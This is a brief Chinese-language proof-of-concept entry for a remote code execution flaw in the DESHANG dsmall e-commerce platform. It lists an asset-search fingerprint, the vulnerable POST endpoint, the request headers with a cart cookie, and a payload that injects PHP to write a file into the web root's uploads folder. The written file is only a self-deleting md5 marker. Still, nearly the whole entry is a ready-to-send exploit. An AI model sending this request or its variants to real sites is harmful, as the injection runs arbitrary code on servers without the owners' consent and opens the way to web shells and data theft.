# 德尚网络电商系统article存在远程代码执行漏洞

- **系统**：德尚网络电商系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="DESHANG-DSMALL"`
- **请求**：`POST /index.php?s=home/article/index HTTP/1.1`
- **关键头**：`Content-Length: 287`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: cart=AAy55Yx63XBVVv92xG_Mjp47gS7Kz8Q4yWN43JG5FBAGYUKdaUSGFc5IOUEZuu9sb-G6vK26S3_…`

**请求体 / payload**
```
img=if(!is_dir($_SERVER['DOCUMENT_ROOT'].'/uploads/')){mkdir($_SERVER['DOCUMENT_ROOT'].'/uploads',777,true);}file_put_contents($_SERVER['DOCUMENT_ROOT'].'/uploads/uploadHello.php',hex2bin('3c3f706870206563686f206d64352831293b20756e6c696e6b285f5f46494c455f5f293b203f3e'));
```
- **预期**：200　|　—